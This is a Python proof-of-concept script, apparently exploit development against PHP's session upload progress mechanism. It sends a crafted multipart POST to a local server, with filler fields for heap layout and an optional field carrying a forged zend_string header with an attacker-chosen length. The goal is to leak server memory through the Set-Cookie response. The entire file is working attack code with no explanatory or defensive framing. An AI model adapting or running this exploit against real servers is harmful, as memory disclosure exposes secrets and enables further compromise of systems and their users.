#!/usr/bin/env python3
"""Numeric-key B with per-field 48-char values; optional forge field.

usage: b_numleak2.py N FORGE LEAK_LEN
- N filler fields, value = 'v%04d' + 'x'*(48-5)
- if FORGE: append one field with 79-byte value whose raw buffer (80B) carries a
  forged zend_string header at content offset 0x10 (len) and data at 0x18.
"""
import socket,sys,struct
N=int(sys.argv[1]); FORGE=int(sys.argv[2]) if len(sys.argv)>2 else 0
LEAK=int(sys.argv[3],0) if len(sys.argv)>3 else 0x1000
BND=b'B'*10
parts=[{'n':'PHPSESSID','d':b'attacksessionid0001'},{'n':'PHP_SESSION_UPLOAD_PROGRESS','d':b'pwn'}]
for i in range(N):
    val=(('v%04d'%i)+'x'*44)[:48]
    parts.append({'n':str(1000+i),'d':val.encode()})
if FORGE:
    v=bytearray(b'A'*79)
    struct.pack_into('<Q',v,0x10,LEAK)
    v[0x18]=ord('L')
    parts.append({'n':'1999','d':bytes(v)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['n'].encode()+b'"\r\n\r\n'+p['d']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
data=b''
try:
    s.sendall(h+bytes(o))
    while len(data)<9000000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e:
    print("recv_err",repr(e))
s.close()
head,_,rest=data.partition(b'\r\n\r\n')
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print("SETCOOKIE_LEN",len(line)); print("VALUE",line[:220].decode('latin1','replace'))
print("HEAD_LEN",len(head)); print("BODY",rest[:100].decode('latin1','replace'))
open('/tmp/b_numleak2.resp','wb').write(data)
